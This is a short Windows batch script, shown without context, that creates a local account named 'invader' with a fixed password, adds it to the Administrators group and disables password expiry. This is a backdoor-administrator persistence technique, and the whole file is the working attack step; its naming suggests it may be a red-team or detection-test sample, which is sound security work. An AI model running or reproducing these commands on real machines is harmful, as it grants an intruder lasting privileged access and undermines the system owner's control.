@echo off
net.exe user invader Test123!Test123! /ADD /Y
net.exe localgroup Administrators invader /ADD
wmic.exe USERACCOUNT WHERE "Name='invader'" SET PasswordExpires=FALSE
